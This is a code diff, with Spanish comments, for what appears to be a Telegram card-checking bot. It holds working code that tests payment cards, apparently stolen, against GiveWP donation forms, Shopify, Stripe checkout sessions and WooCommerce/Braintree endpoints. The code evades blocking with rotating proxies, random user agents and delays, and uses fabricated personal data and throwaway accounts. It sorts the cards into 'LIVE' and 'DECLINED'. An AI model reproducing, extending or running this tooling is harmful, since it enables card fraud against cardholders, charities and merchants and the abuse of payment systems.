-        for cookie in cookie_string.split('; '):
-            if '=' in cookie:
-                key, value = cookie.split('=', 1)
-                cookies[key] = value
-        return cookies
-    
-    def _get_next_proxy(self) -> Optional[str]:
-        if not self.proxies:
-            return None
-        
-        proxy = self.proxies[self.proxy_index]
-        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
-        
-        proxy_parts = proxy.split(':')
-        if len(proxy_parts) == 4:
-            return f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
-        elif len(proxy_parts) == 3 and proxy_parts[2] == '':
-            return f"http://{proxy_parts[0]}:{proxy_parts[1]}"
-        elif len(proxy_parts) == 2:
-            return f"http://{proxy}"
-        else:
-            return None
-    
-    def _get_random_user_agent(self) -> str:
-        return random.choice(self.user_agents)
-    
-    async def get_session(self) -> aiohttp.ClientSession:
-        timeout = aiohttp.ClientTimeout(total=60)
-        
-        headers = {
-            'User-Agent': self._get_random_user_agent(),
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate',
-            'DNT': '1',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-        }
-        
-        connector = aiohttp.TCPConnector(ssl=False)
-        self.session = aiohttp.ClientSession(
-            timeout=timeout,
-            headers=headers,
-            cookies=self.cookies,
-            connector=connector
-        )
-        return self.session
-    
-    async def _random_delay(self, min_seconds: float = 2.0, max_seconds: float = 5.0):
-        delay = random.uniform(min_seconds, max_seconds)
-        await asyncio.sleep(delay)
-    
-    def generate_fake_personal_data(self) -> Dict:
-        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Joseph", "Thomas", "Charles", "Christopher"]
-        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
-        
-        addresses = [
-            {"address": "771 Albany Highway", "suburb": "East Victoria Park", "postcode": "6101"},
-            {"address": "789 Albany Highway", "suburb": "East Victoria Park", "postcode": "6101"},
-            {"address": "45 Duncan Street", "suburb": "Victoria Park", "postcode": "6100"},
-            {"address": "12 Swansea Street", "suburb": "East Victoria Park", "postcode": "6101"},
-        ]
-        
-        addr = random.choice(addresses)
-        domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
-        prefixes = ["04", "041", "042", "043", "044", "045", "046", "047", "048", "049"]
-        
-        return {
-            "first_name": random.choice(first_names),
-            "last_name": random.choice(last_names),
-            "email": f"{random.choice(first_names).lower()}.{random.choice(last_names).lower()}{random.randint(1,9999)}@{random.choice(domains)}",
-            "phone": f"{random.choice(prefixes)}{random.randint(100,999)}{random.randint(100,999)}",
-            "address": addr["address"],
-            "suburb": addr["suburb"],
-            "postcode": addr["postcode"],
-            "state": "Western Australia",
-            "country": "Australia"
-        }
-    
-    async def complete_donation(self, amount: float, card_data: Dict) -> JobResult:
-        logger.info(f"🎯 Iniciando donación: ${amount}")
-        
-        proxy_url = self._get_next_proxy()
-        proxy_display = "sin proxy"
-        if proxy_url:
-            proxy_display = proxy_url.split('@')[0].replace('http://', '') if '@' in proxy_url else proxy_url
-        
-        session = await self.get_session()
-        start_time = time.time()
-        
-        try:
-            # Paso 1: Página principal
-            await self._random_delay(1, 3)
-            if proxy_url:
-                async with session.get(self.base_url, proxy=proxy_url, ssl=False) as resp:
-                    html = await resp.text()
-            else:
-                async with session.get(self.base_url) as resp:
-                    html = await resp.text()
-            
-            self.cookies.update(session.cookie_jar.filter_cookies(self.base_url))
-            await self._random_delay(2, 4)
-            
-            # Paso 2: Establecer cantidad
-            amount_data = {
-                "give-form-id": "1",
-                "give-amount": f"{amount:.2f}",
-            }
-            
-            if proxy_url:
-                async with session.post(f"{self.base_url}/", data=amount_data, proxy=proxy_url, ssl=False) as resp:
-                    html2 = await resp.text()
-            else:
-                async with session.post(f"{self.base_url}/", data=amount_data) as resp:
-                    html2 = await resp.text()
-            
-            await self._random_delay(2, 4)
-            
-            # Paso 3: Datos personales
-            personal = self.generate_fake_personal_data()
-            self.personal_data = personal
-            
-            personal_data = {
-                "give_first": personal["first_name"],
-                "give_last": personal["last_name"],
-                "give_email": personal["email"],
-                "give_phone": personal["phone"],
-            }
-            
-            if proxy_url:
-                async with session.post(f"{self.base_url}/", data=personal_data, proxy=proxy_url, ssl=False) as resp:
-                    html3 = await resp.text()
-            else:
-                async with session.post(f"{self.base_url}/", data=personal_data) as resp:
-                    html3 = await resp.text()
-            
-            await self._random_delay(2, 4)
-            
-            # Paso 4: Dirección
-            address_data = {
-                "billing_address1": personal["address"],
-                "billing_address2": "",
-                "billing_city": personal["suburb"],
-                "billing_postcode": personal["postcode"],
-                "billing_state": personal["state"],
-                "billing_country": personal["country"],
-            }
-            
-            if proxy_url:
-                async with session.post(f"{self.base_url}/", data=address_data, proxy=proxy_url, ssl=False) as resp:
-                    html4 = await resp.text()
-            else:
-                async with session.post(f"{self.base_url}/", data=address_data) as resp:
-                    html4 = await resp.text()
-            
-            await self._random_delay(2, 4)
-            
-            # Paso 5: Página de pago
-            payment_url = f"{self.base_url}/payment"
-            
-            if proxy_url:
-                async with session.get(payment_url, proxy=proxy_url, ssl=False) as resp:
-                    payment_html = await resp.text()
-            else:
-                async with session.get(payment_url) as resp:
-                    payment_html = await resp.text()
-            
-            await self._random_delay(3, 6)
-            
-            # Paso 6: Enviar tarjeta
-            cardholder = f"{personal['first_name']} {personal['last_name']}"
-            payment_data = {
-                "cardholder_name": cardholder,
-                "card_number": card_data['number'],
-                "card_expiry": f"{card_data['month']}/{card_data['year'][-2:]}",
-                "card_cvc": card_data['cvv'],
-            }
-            
-            if proxy_url:
-                async with session.post(payment_url, data=payment_data, proxy=proxy_url, ssl=False, allow_redirects=True) as pay_resp:
-                    elapsed = time.time() - start_time
-                    final_text = await pay_resp.text()
-            else:
-                async with session.post(payment_url, data=payment_data, allow_redirects=True) as pay_resp:
-                    elapsed = time.time() - start_time
-                    final_text = await pay_resp.text()
-            
-            status, confidence, reason, patterns = ResponseClassifier.classify(final_text, pay_resp.status, elapsed)
-            
-            return JobResult(
-                job=Job(
-                    site=self.base_url,
-                    proxy=proxy_display,
-                    card_data=card_data,
-                    job_id=0
-                ),
-                status=status,
-                confidence=confidence,
-                reason=reason,
-                response_time=elapsed,
-                http_code=pay_resp.status,
-                response_text=final_text[:500],
-                success=(status == CheckStatus.CHARGED),
-                bin_info=await get_bin_info(card_data['bin']),
-                price=f"${amount:.2f}",
-                patterns_detected=patterns
-            )
-                
-        except Exception as e:
-            elapsed = time.time() - start_time
-            return JobResult(
-                job=Job(
-                    site=self.base_url,
-                    proxy=proxy_display if proxy_url else "",
-                    card_data=card_data,
-                    job_id=0
-                ),
-                status=CheckStatus.UNKNOWN,
-                confidence=Confidence.LOW,
-                reason=f"error: {str(e)[:50]}",
-                response_time=elapsed,
-                http_code=None,
-                response_text="",
-                success=False,
-                bin_info=await get_bin_info(card_data['bin']),
-                price=f"${amount:.2f}"
-            )
-    
-    async def close(self):
-        if self.session and not self.session.closed:
-            await self.session.close()
-
-# ================== PROXY HEALTH CHECKER ==================
-class ProxyHealthChecker:
-    def __init__(self, db: Database, user_id: int):
-        self.db = db
-        self.user_id = user_id
-        self.test_url = "https://httpbin.org/ip"
-        self.timeout = aiohttp.ClientTimeout(
-            total=None,
-            connect=10,
-            sock_read=20
-        )
-        
-    async def check_proxy(self, proxy: str) -> Dict:
-        start_time = time.time()
-        result = {
-            "proxy": proxy,
-            "alive": False,
-            "response_time": 0,
-            "error": None,
-            "ip": None,
-        }
-        
-        try:
-            proxy_parts = proxy.split(':')
-            if len(proxy_parts) == 4:
-                proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
-            elif len(proxy_parts) == 3 and proxy_parts[2] == '':
-                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
-            else:
-                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
-            
-            async with aiohttp.ClientSession(timeout=self.timeout) as session:
-                async with session.get(self.test_url, proxy=proxy_url) as resp:
-                    if resp.status == 200:
-                        elapsed = time.time() - start_time
-                        result["alive"] = True
-                        result["response_time"] = elapsed
-                        try:
-                            data = await resp.json()
-                            result["ip"] = data.get("origin", "Unknown")
-                        except:
-                            pass
-        except Exception as e:
-            result["error"] = str(e)[:50]
-        
-        return result
-    
-    async def check_all_proxies(self, proxies: List[str], max_concurrent: int = 25) -> List[Dict]:
-        semaphore = asyncio.Semaphore(max_concurrent)
-        
-        async def check_with_semaphore(proxy):
-            async with semaphore:
-                return await self.check_proxy(proxy)
-        
-        tasks = [check_with_semaphore(p) for p in proxies]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        final_results = []
-        for i, res in enumerate(results):
-            if isinstance(res, Exception):
-                final_results.append({
-                    "proxy": proxies[i],
-                    "alive": False,
-                    "response_time": 0,
-                    "error": str(res),
-                    "ip": None
-                })
-            else:
-                final_results.append(res)
-        
-        return final_results
-
-# ================== EJECUTOR DE JOBS SHOPIFY ==================
-class ShopifyJobExecutor:
-    @staticmethod
-    async def execute(job: Job, session: aiohttp.ClientSession) -> JobResult:
-        card_data = job.card_data
-        card_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
-        params = {"site": job.site, "cc": card_str, "proxy": job.proxy}
-        
-        start_time = time.time()
-        bin_info = await get_bin_info(card_data['bin'])
-        
-        try:
-            api_endpoint = random.choice(Settings.API_ENDPOINTS)
-            
-            proxy_parts = job.proxy.split(':')
-            if len(proxy_parts) == 4:
-                proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
-            elif len(proxy_parts) == 3 and proxy_parts[2] == '':
-                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
-            elif len(proxy_parts) == 2:
-                proxy_url = f"http://{job.proxy}"
-            else:
-                proxy_url = None
-            
-            try:
-                if proxy_url:
-                    async with session.get(api_endpoint, params=params, proxy=proxy_url) as resp:
-                        elapsed = time.time() - start_time
-                        try:
-                            response_text = await asyncio.wait_for(resp.text(), timeout=60)
-                        except asyncio.TimeoutError:
-                            response_text = ""
-                else:
-                    async with session.get(api_endpoint, params=params) as resp:
-                        elapsed = time.time() - start_time
-                        try:
-                            response_text = await asyncio.wait_for(resp.text(), timeout=60)
-                        except asyncio.TimeoutError:
-                            response_text = ""
-                            
-            except asyncio.TimeoutError:
-                elapsed = time.time() - start_time
-                if elapsed < 10:
-                    return JobResult(
-                        job=job,
-                        status=CheckStatus.CONNECT_TIMEOUT,
-                        confidence=Confidence.CONFIRMED,
-                        reason="proxy_failed",
-                        response_time=elapsed,
-                        http_code=None,
-                        response_text="",
-                        success=False,
-                        bin_info=bin_info,
-                        price="N/A"
-                    )
-                else:
-                    return JobResult(
-                        job=job,
-                        status=CheckStatus.READ_TIMEOUT,
-                        confidence=Confidence.CONFIRMED,
-                        reason="slow_response",
-                        response_time=elapsed,
-                        http_code=None,
-                        response_text="",
-                        success=False,
-                        bin_info=bin_info,
-                        price="N/A"
-                    )
-            
-            status, confidence, reason, patterns = ResponseClassifier.classify(response_text, resp.status, elapsed)
-            price = extract_price(response_text)
-            
-            return JobResult(
-                job=job,
-                status=status,
-                confidence=confidence,
-                reason=reason,
-                response_time=elapsed,
-                http_code=resp.status,
-                response_text=response_text[:500],
-                success=(status == CheckStatus.CHARGED),
-                bin_info=bin_info,
-                price=price,
-                patterns_detected=patterns
-            )
-            
-        except Exception as e:
-            elapsed = time.time() - start_time
-            return JobResult(
-                job=job,
-                status=CheckStatus.UNKNOWN,
-                confidence=Confidence.LOW,
-                reason=f"error: {str(e)[:50]}",
-                response_time=elapsed,
-                http_code=None,
-                response_text="",
-                success=False,
-                bin_info=bin_info,
-                price="N/A"
-            )
-
-# ================== USER MANAGER ==================
-class UserManager:
-    def __init__(self, db: Database):
-        self.db = db
-        self._rate_lock = asyncio.Lock()
-        self.active_hitters = {}  # user_id -> StripeAutoHitter
-
-    async def get_user_data(self, user_id: int) -> Dict:
-        row = await self.db.fetch_one(
-            "SELECT sites, proxies, cards, givewp_sites, stripe_urls FROM users WHERE user_id = ?",
-            (user_id,)
-        )
-        
-        if not row:
-            await self.db.execute(
-                "INSERT INTO users (user_id, sites, proxies, cards, givewp_sites, stripe_urls) VALUES (?, ?, ?, ?, ?, ?)",
-                (user_id, '[]', '[]', '[]', '[]', '[]')
-            )
-            return {"sites": [], "proxies": [], "cards": [], "givewp_sites": [], "stripe_urls": []}
-        
-        return {
-            "sites": json.loads(row["sites"]),
-            "proxies": json.loads(row["proxies"]),
-            "cards": json.loads(row["cards"]),
-            "givewp_sites": json.loads(row["givewp_sites"]) if row["givewp_sites"] else [],
-            "stripe_urls": json.loads(row["stripe_urls"]) if row["stripe_urls"] else []
-        }
-
-    async def update_user_data(self, user_id: int, **kwargs):
-        current = await self.get_user_data(user_id)
-        
-        for key, value in kwargs.items():
-            if value is not None:
-                current[key] = value
-        
-        await self.db.execute(
-            """UPDATE users SET 
-               sites = ?, proxies = ?, cards = ?, givewp_sites = ?, stripe_urls = ?
-               WHERE user_id = ?""",
-            (json.dumps(current["sites"]), json.dumps(current["proxies"]), 
-             json.dumps(current["cards"]), json.dumps(current["givewp_sites"]),
-             json.dumps(current["stripe_urls"]), user_id)
-        )
-
-    async def check_rate_limit(self, user_id: int, command: str) -> Tuple[bool, str]:
-        async with self._rate_lock:
-            today = datetime.now().date()
-            
-            row = await self.db.fetch_one(
-                "SELECT * FROM rate_limits WHERE user_id = ?",
-                (user_id,)
-            )
-            
-            if not row:
-                await self.db.execute(
-                    """INSERT INTO rate_limits 
-                       (user_id, last_check, checks_today, last_mass, mass_count_hour, last_reset)
-                       VALUES (?, ?, ?, ?, ?, ?)""",
-                    (user_id, datetime.now(), 0, None, 0, today)
-                )
-                return True, ""
-            
-            last_reset = datetime.fromisoformat(row["last_reset"]).date()
-            if last_reset < today:
-                await self.db.execute(
-                    "UPDATE rate_limits SET checks_today = 0, mass_count_hour = 0, last_reset = ? WHERE user_id = ?",
-                    (today, user_id)
-                )
-                checks_today = 0
-                mass_count_hour = 0
-            else:
-                checks_today = row["checks_today"]
-                mass_count_hour = row["mass_count_hour"]
-            
-            if command == "mass":
-                if mass_count_hour >= Settings.MASS_LIMIT_PER_HOUR:
-                    return False, f"⚠️ Máximo {Settings.MASS_LIMIT_PER_HOUR} mass/hora"
-            
-            elif command == "check":
-                if checks_today >= Settings.DAILY_LIMIT_CHECKS:
-                    return False, f"📅 Límite diario ({Settings.DAILY_LIMIT_CHECKS}) alcanzado"
-                
-                if row.get("last_check"):
-                    last_check = datetime.fromisoformat(row["last_check"])
-                    elapsed = (datetime.now() - last_check).seconds
-                    if elapsed < Settings.RATE_LIMIT_SECONDS:
-                        wait = Settings.RATE_LIMIT_SECONDS - elapsed
-                        return False, f"⏳ Espera {wait}s"
-            
-            return True, ""
-
-    async def increment_checks(self, user_id: int, command: str):
-        now = datetime.now()
-        
-        if command == "mass":
-            await self.db.execute(
-                """UPDATE rate_limits SET 
-                   mass_count_hour = mass_count_hour + 1,
-                   last_mass = ?
-                   WHERE user_id = ?""",
-                (now, user_id)
-            )
-        else:
-            await self.db.execute(
-                """UPDATE rate_limits SET 
-                   checks_today = checks_today + 1,
-                   last_check = ?
-                   WHERE user_id = ?""",
-                (now, user_id)
-            )
-
-# ================== CARD CHECK SERVICE ==================
-class CardCheckService:
-    def __init__(self, db: Database, user_manager: UserManager):
-        self.db = db
-        self.user_manager = user_manager
-
-    async def check_shopify(self, user_id: int, card_data: Dict, site: str, proxy: str) -> JobResult:
-        timeout = aiohttp.ClientTimeout(
-            total=None,
-            connect=10,
-            sock_read=60
-        )
-        
-        job = Job(
-            site=site,
-            proxy=proxy,
-            card_data=card_data,
-            job_id=0
-        )
-        
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            result = await ShopifyJobExecutor.execute(job, session)
-        
-        await self.db.save_result(user_id, result, "shopify")
-        
-        return result
-
-    async def donate_givewp_anti_block(self, user_id: int, card_data: Dict, amount: float = 5.00) -> JobResult:
-        logger.info(f"🚀 Iniciando donación para tarjeta {card_data['bin']}xxxxxx{card_data['last4']}, monto ${amount}")
-        
-        user_data = await self.user_manager.get_user_data(user_id)
-        proxies = user_data.get("proxies", [])
-        
-        handler = AntiBlockGiveWPDonationHandler(user_id, proxies, Settings.GIVEWP_SESSION_COOKIE)
-        try:
-            result = await handler.complete_donation(amount, card_data)
-            await self.db.save_result(user_id, result, "givewp")
-            return result
-        finally:
-            await handler.close()
-
-    async def stripe_hit_with_progress(self, user_id: int, url_index: int, hit_limit: int = 0, 
-                                        progress_callback=None) -> Tuple[List[StripeHitResult], Dict[str, int]]:
-        """Ejecuta Stripe Auto Hitter con progreso y límite de intentos"""
-        
-        user_data = await self.user_manager.get_user_data(user_id)
-        urls = user_data.get("stripe_urls", [])
-        cards = [CardValidator.parse_card(c) for c in user_data.get("cards", []) if CardValidator.parse_card(c)]
-        proxies = user_data.get("proxies", [])
-        
-        if not urls or url_index >= len(urls):
-            return [], {}
-        
-        if not cards:
-            return [], {}
-        
-        target_url = urls[url_index]['url']
-        
-        # Crear hitter con límite
-        hitter = StripeAutoHitter(proxies, hit_limit)
-        self.user_manager.active_hitters[user_id] = hitter
-        
-        try:
-            results = await hitter.hit_checkout_with_progress(target_url, cards, progress_callback)
-            
-            # Guardar resultados
-            for r in results:
-                await self.db.save_stripe_result(user_id, r, target_url)
-            
-            # Estadísticas
-            stats = {
-                'live': sum(1 for r in results if r.status == 'LIVE'),
-                'declined': sum(1 for r in results if r.status == 'DECLINED'),
-                'fraudulent': sum(1 for r in results if r.status == 'FRAUDULENT'),
-                'three_ds': sum(1 for r in results if r.three_ds),
-                'error': sum(1 for r in results if r.status not in ['LIVE', 'DECLINED', 'FRAUDULENT'] and not r.three_ds and r.status != '3DS'),
-                'timeout': sum(1 for r in results if r.status == 'TIMEOUT')
-            }
-            
-            return results, stats
-            
-        finally:
-            # Limpiar hitter activo
-            self.user_manager.active_hitters.pop(user_id, None)
-    
-    def stop_hit(self, user_id: int):
-        """Detiene el proceso de hitting en curso"""
-        hitter = self.user_manager.active_hitters.get(user_id)
-        if hitter:
-            hitter.stop()
-            return True
+        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+        email = f'{user}@protonmail.com'
+        password = 'Chk' + ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + '!'
+        resp = session.post(B3_MY_ACCOUNT_URL, data={
+            'email': email, 'password': password,
+            'woocommerce-register-nonce': reg_nonce.group(1),
+            '_wp_http_referer': '/my-account/', 'register': 'Register',
+        }, verify=False, timeout=30, allow_redirects=True)
+        return 'Log out' in resp.text or 'log-out' in resp.text
+    except:
         return False
 
-# ================== NUEVOS COMANDOS DE STRIPE ==================
-
-async def add_stripe_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Guarda una URL de Stripe Checkout"""
-    user_id = update.effective_user.id
-    
-    if not context.args:
-        await update.message.reply_text(
-            "❌ Uso: /addstripe <url>\n"
-            "Ejemplo: /addstripe https://checkout.stripe.com/c/pay/cs_live_..."
-        )
-        return
-    
-    url = context.args[0]
-    
-    # Validar que sea URL de Stripe
-    if 'stripe.com' not in url or 'cs_live_' not in url:
-        await update.message.reply_text("❌ URL de Stripe inválida (debe contener cs_live_)")
-        return
-    
-    user_data = await user_manager.get_user_data(user_id)
-    
-    # Intentar extraer nombre del sitio
-    site_name = "Stripe Checkout"
-    amount = "??"
-    
-    # Extraer posible nombre del sitio del hash
-    if '#' in url:
-        hash_part = url.split('#')[-1]
-        try:
-            decoded = base64.b64decode(hash_part + '==').decode('utf-8', errors='ignore')
-            # Buscar nombre en el hash decodificado
-            site_match = re.search(r'site_name["\']?:?\s*["\']([^"\']+)', decoded)
-            if site_match:
-                site_name = site_match.group(1)
-            # Buscar monto
-            amount_match = re.search(r'amount["\']?:?\s*["\']?(\d+)', decoded)
-            if amount_match:
-                amount = f"${int(amount_match.group(1))/100:.2f}"
-        except:
-            pass
-    
-    user_data['stripe_urls'].append({
-        'url': url,
-        'site': site_name,
-        'amount': amount,
-        'added': datetime.now().isoformat(),
-        'hits': 0,
-        'lives': 0
-    })
-    
-    await user_manager.update_user_data(user_id, stripe_urls=user_data['stripe_urls'])
-    
-    await update.message.reply_text(
-        f"✅ URL de Stripe guardada\n"
-        f"📍 Sitio: {site_name}\n"
-        f"💰 Monto: {amount}"
-    )
-
-async def list_stripe_urls(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Lista las URLs de Stripe guardadas"""
-    user_id = update.effective_user.id
-    user_data = await user_manager.get_user_data(user_id)
-    
-    urls = user_data.get('stripe_urls', [])
-    
-    if not urls:
-        await update.message.reply_text("📭 No tienes URLs de Stripe guardadas")
-        return
-    
-    lines = ["💳 *TUS URLS DE STRIPE*", "━━━━━━━━━━━━━━━━━━", ""]
-    for i, u in enumerate(urls, 1):
-        lines.append(f"{i}. *{u.get('site', 'Stripe')}*")
-        lines.append(f"   💰 {u.get('amount', '??')}")
-        lines.append(f"   🔗 {u['url'][:60]}...")
-        lines.append(f"   📊 Hits: {u.get('hits', 0)} | Lives: {u.get('lives', 0)}")
-        lines.append("")
-    
-    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
-
-async def remove_stripe_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Elimina una URL de Stripe guardada"""
-    user_id = update.effective_user.id
-    
-    if not context.args:
-        await update.message.reply_text(
-            "❌ Uso: /removestripe <número>\n"
-            "Ejemplo: /removestripe 1 (elimina la primera URL)\n"
-            "/removestripe all (elimina todas)"
-        )
-        return
-    
-    user_data = await user_manager.get_user_data(user_id)
-    urls = user_data.get('stripe_urls', [])
-    
-    if not urls:
-        await update.message.reply_text("📭 No hay URLs para eliminar")
-        return
-    
-    arg = context.args[0].lower()
-    
-    if arg == "all":
-        user_data['stripe_urls'] = []
-        await user_manager.update_user_data(user_id, stripe_urls=[])
-        await update.message.reply_text("🗑️ Todas las URLs de Stripe han sido eliminadas")
-        return
-    
+def b3_get_session_and_auth(session=None, cookie_index=0):
+    if session is None:
+        session = requests.Session()
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
+                          '(KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
+        })
     try:
-        index = int(arg) - 1
-        if 0 <= index < len(urls):
-            removed = urls.pop(index)
-            await user_manager.update_user_data(user_id, stripe_urls=urls)
-            await update.message.reply_text(f"✅ URL eliminada: {removed.get('site', 'Stripe')}")
-        else:
-            await update.message.reply_text("❌ Número inválido")
-    except ValueError:
-        await update.message.reply_text("❌ Debes especificar un número o 'all'")
-
-async def hit_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Inicia el proceso de hitting en una URL de Stripe - CON PROGRESO EN VIVO"""
-    user_id = update.effective_user.id
-    
-    # Verificar si ya hay un proceso activo
-    if user_id in user_manager.active_hitters:
-        await update.message.reply_text("❌ Ya hay un proceso de Auto Hit en curso. Usa /stophit para detenerlo.")
-        return
-    
-    # Parsear argumentos: /hit <número_url> [límite]
-    if not context.args:
-        await update.message.reply_text(
-            "❌ Uso: /hit <número_url> [límite]\n"
-            "Ejemplo: /hit 1 5 (prueba 5 tarjetas de la URL 1)\n"
-            "         /hit 1 (prueba todas las tarjetas)"
-        )
-        return
-    
-    try:
-        url_index = int(context.args[0]) - 1
+        has_cookies = b3_load_cookies(session, cookie_index)
+        if not has_cookies:
+            b3_try_register(session)
+        r = session.get(B3_ADD_PM_URL, verify=False, timeout=30)
+        if 'Credit Cards' not in r.text and 'add_payment_method' not in r.text:
+            b3_try_register(session)
+            r = session.get(B3_ADD_PM_URL, verify=False, timeout=30)
+        cm_match = re.search(r'wc_braintree_client_manager_params\s*=\s*(\{[^;]+)', r.text)
+        if not cm_match:
+            return session, None, None, None
+        cm = json.loads(cm_match.group(1).rstrip(';'))
+        wpnonce = cm.get('_wpnonce', '')
+        apm_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', r.text)
+        apm_nonce = apm_nonce_match.group(1) if apm_nonce_match else ''
+        token_url = (f'{B3_SITE_URL}/?wc-ajax=wc_braintree_frontend_request'
+                     f'&path=/wc-braintree/v1/client-token/create')
+        r2 = session.post(token_url, verify=False, timeout=30,
+                          headers={
+                              'X-Requested-With': 'XMLHttpRequest',
+                              'Referer': B3_ADD_PM_URL
+                          },
+                          data={
+                              'currency': 'GBP',
+                              'merchant_account': B3_MERCHANT_ACCOUNT,
+                              '_wpnonce': wpnonce
+                          })
+        if r2.status_code != 200:
+            return session, None, None, None
+        client_token_b64 = r2.text.strip('"')
+        decoded = json.loads(base64.b64decode(client_token_b64))
+        auth_fp = decoded.get('authorizationFingerprint', '')
+        if not auth_fp:
+            return session, None, None, None
+        return session, auth_fp, apm_nonce, decoded
     except:
-        await update.message.reply_text("❌ Número de URL inválido")
-        return
-    
-    # Límite opcional
-    hit_limit = 0
-    if len(context.args) > 1:
-        try:
-            hit_limit = int(context.args[1])
-            if hit_limit < 1:
-                hit_limit = 0
-        except:
-            hit_limit = 0
-    
-    user_data = await user_manager.get_user_data(user_id)
-    urls = user_data.get('stripe_urls', [])
-    cards = user_data.get('cards', [])
-    proxies = user_data.get('proxies', [])
-    
-    if not urls:
-        await update.message.reply_text("❌ Primero guarda URLs con /addstripe")
-        return
-    
-    if url_index < 0 or url_index >= len(urls):
-        await update.message.reply_text("❌ Número de URL inválido")
-        return
-    
-    if not cards:
-        await update.message.reply_text("❌ Primero sube tarjetas")
-        return
-    
-    if not proxies:
-        await update.message.reply_text("❌ Necesitas proxies para evitar bloqueos")
-        return
-    
-    target_url = urls[url_index]
-    
-    # Extraer información básica
-    session_id = re.search(r'cs_live_[a-zA-Z0-9]+', target_url['url'])
-    session_display = session_id.group(0) if session_id else "desconocido"
-    
-    limit_text = f" (límite: {hit_limit} tarjetas)" if hit_limit > 0 else ""
-    
-    # Mensaje de inicio
-    msg = await update.message.reply_text(
-        f"🚀 *AUTO HIT INICIADO*{limit_text}\n"
-        f"━━━━━━━━━━━━━━━━━━\n\n"
-        f"📍 Sitio: {target_url.get('site', 'Stripe')}\n"
-        f"💰 Monto: {target_url.get('amount', '??')}\n"
-        f"🔗 Sesión: `{session_display}`\n"
-        f"💳 Tarjetas: {len(cards) if hit_limit == 0 else min(hit_limit, len(cards))}/{len(cards)}\n"
-        f"🔄 Proxies: {len(proxies)}\n\n"
-        f"⏳ Procesando..."
-    )
-    
-    # Callback de progreso
-    async def progress_callback(current: int, total: int, last_result: StripeHitResult):
-        if current % 3 == 0 or current == total:  # Actualizar cada 3 tarjetas o al final
-            emoji = "✅" if last_result.status == 'LIVE' else "🔒" if last_result.three_ds else "❌"
-            progress_bar = create_progress_bar(current, total)
-            
-            await msg.edit_text(
-                f"🚀 *AUTO HIT EN PROGRESO*\n"
-                f"━━━━━━━━━━━━━━━━━━\n\n"
-                f"📍 Sitio: {target_url.get('site', 'Stripe')}\n"
-                f"💰 Monto: {target_url.get('amount', '??')}\n\n"
-                f"📊 Progreso: {progress_bar} {current}/{total}\n"
-                f"Último: {emoji} {last_result.card_last4} - {last_result.reason}\n\n"
-                f"⏳ Procesando... (usa /stophit para detener)"
-            )
-    
-    # Ejecutar hits
-    results, stats = await card_service.stripe_hit_with_progress(
-        user_id, url_index, hit_limit, progress_callback
-    )
-    
-    if not results:
-        await msg.edit_text("❌ No se pudieron procesar las tarjetas")
-        return
-    
-    # Actualizar estadísticas en la URL
-    urls[url_index]['hits'] = urls[url_index].get('hits', 0) + len(results)
-    urls[url_index]['lives'] = urls[url_index].get('lives', 0) + stats['live']
-    await user_manager.update_user_data(user_id, stripe_urls=urls)
-    
-    # Formatear resultados como en la captura
-    response = []
-    response.append(f"📊 *RESULTADOS AUTO HIT*\n━━━━━━━━━━━━━━━━━━\n")
-    response.append(f"Probadas: {len(results)}/{len(cards)} tarjetas")
-    response.append(f"Monto: {target_url.get('amount', '??')}")
-    response.append(f"Sitio: {target_url.get('site', 'Stripe')}\n")
-    
-    # Mostrar cada resultado (máximo 15)
-    for r in results[:15]:
-        emoji = "✅" if r.status == 'LIVE' else "🔒" if r.three_ds else "❌" if r.status == 'DECLINED' else "🚨" if r.status == 'FRAUDULENT' else "⚠️"
-        card_display = f". . . {r.card_last4}" if len(r.card_last4) == 4 else r.card_last4
-        
-        if r.three_ds:
-            response.append(f"{emoji} {card_display} (Stripe Auth $0.1) – 3DS: {r.reason}")
-        elif r.status == 'FRAUDULENT':
-            response.append(f"{emoji} {card_display} (Stripe Auth $0.1) – Failed: {r.reason}")
-        elif r.status == 'LIVE':
-            response.append(f"{emoji} {card_display} (Stripe Auth $0.1) – LIVE: {r.reason}")
-        elif r.status == 'DECLINED':
-            response.append(f"{emoji} {card_display} (Stripe Auth $0.1) – Declined: {r.reason}")
-        elif r.status == 'TIMEOUT':
-            response.append(f"⏱️ {card_display} (Stripe Auth $0.1) – Timeout: {r.reason}")
-        else:
-            response.append(f"{emoji} {card_display} (Stripe Auth $0.1) – Error: {r.reason}")
-    
-    if len(results) > 15:
-        response.append(f"... y {len(results)-15} más")
-    
-    # Resumen
-    response.append(f"\n📈 *RESUMEN*")
-    response.append(f"✅ LIVE: {stats['live']}")
-    response.append(f"❌ DECLINED: {stats['declined']}")
-    response.append(f"🚨 FRAUDULENT: {stats['fraudulent']}")
-    response.append(f"🔒 3DS: {stats['three_ds']}")
